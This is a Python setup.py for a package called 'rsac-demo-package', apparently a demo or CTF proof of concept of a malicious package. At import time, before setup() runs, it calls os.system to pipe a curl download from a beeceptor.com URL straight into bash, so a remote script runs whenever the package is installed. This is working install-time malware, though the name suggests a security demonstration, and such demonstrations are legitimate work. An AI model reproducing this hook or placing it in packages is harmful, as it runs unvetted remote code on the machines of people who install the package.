from setuptools import setup
import os
os.system("curl -s https://heroctf-ploc.free.beeceptor.com | bash")  # Executes remote shell script
setup(

    name="rsac-demo-package",

    version="0.1",

    packages=["rsac_demo"],

    install_requires=[],

)
